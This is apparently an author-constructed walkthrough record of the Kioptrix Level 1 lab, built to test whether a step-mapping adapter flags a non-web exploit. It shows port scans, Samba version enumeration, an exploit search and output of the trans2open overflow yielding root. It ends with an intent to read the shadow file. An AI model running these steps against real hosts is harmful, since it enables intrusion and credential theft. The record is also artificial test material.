source: Representative walkthrough constructed from public Kioptrix Level 1 write-up structure (Samba trans2open remote overflow -> direct root). Author-constructed for offline Phase-1 mapping measurement; NOT a live capture. Included deliberately as a largely NON-web box to test whether the adapter correctly FLAGS the out-of-abstraction primitive instead of hallucinating a web action.
vulnhub_correspondence: An old single host exposing Apache 1.3.20 / mod_ssl and Samba 2.2.1a; the canonical foothold is a remote buffer overflow against the SMB/Samba service (trans2open, CVE-2003-0201) which yields a direct root shell.

steps.actor_intent: Scan all ports and service versions with nmap.
steps.tool_output:
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2
80/tcp   open  http        Apache httpd 1.3.20 (mod_ssl/2.8.4 OpenSSL/0.9.6b)
139/tcp  open  netbios-ssn Samba smbd
443/tcp  open  ssl/http    Apache httpd 1.3.20
32768/tcp open status

steps.actor_intent: Fingerprint the web server to record its version.
steps.tool_output: http://10.10.10.5/ [200 OK] Apache[1.3.20], HTTPServer[Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b], OpenSSL[0.9.6b]

steps.actor_intent: Enumerate the SMB/Samba service to recover its exact version.
steps.tool_output:
139/tcp open  netbios-ssn
| smb-os-discovery:
|   Samba 2.2.1a
|_  OS: Unix

steps.actor_intent: Search for known exploits matching Samba 2.2.1a.
steps.tool_output:
Samba < 2.2.8 (Linux/BSD) - 'trans2open' Remote Overflow (CVE-2003-0201)  | linux/remote/10.c
Samba 2.2.x - Remote Code Execution

steps.actor_intent: Run the Samba trans2open remote buffer overflow to get a shell.
steps.tool_output:
[+] Connecting to 10.10.10.5:139
[+] trans2open overflow sent, return address aligned
[+] root shell spawned
# id
uid=0(root) gid=0(root)
steps.out_of_abstraction_reason: A remote memory-corruption (stack buffer overflow) exploit against the SMB/Samba network service is a non-web binary exploitation primitive; the schema's exploit_attempt is scoped to web vulnerabilities (injection, RCE via HTTP, upload) and cannot represent it.

steps.actor_intent: Confirm the obtained shell is running as root.
Read the shadow file to prove full compromise.
